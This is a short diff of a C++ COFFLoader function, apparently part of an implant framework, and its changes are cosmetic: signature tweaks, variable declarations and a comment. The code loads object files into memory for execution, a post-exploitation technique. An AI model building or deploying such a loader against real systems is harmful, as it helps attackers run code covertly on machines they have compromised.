@@ -442,13 +442,13 @@ namespace Objects {
         Free(image);
     }
 
-    VOID COFFLoader(const char *entrypoint, void *data, void *args, const size_t args_size) {
+    VOID COFFLoader(char *entrypoint, void *data, void *args, size_t args_size) {
         HEXANE;
         // NOTE: sec_map seems to be the only thing that persists
 
-        EXECUTABLE *image   = CreateImage((uint8 *) data); ;
-        auto next           = (uint8 *) image->base;
-        bool success        = true;
+        auto image    = CreateImage((uint8 *) data); ;
+        auto next     = (uint8 *) image->base;
+        bool success  = true;
 
         x_assertb(image->buffer    = (uint8 *) data);
         x_assertb(image->sec_map   = (OBJECT_MAP *) Malloc(sizeof(void*) * sizeof(OBJECT_MAP)));
@@ -489,7 +489,7 @@ namespace Objects {
 
         defer:
         if (success) {
-            // LOG SUCCESS?
+            // LOG SUCCESS (?)
         }
         else {
             // LOG ERROR
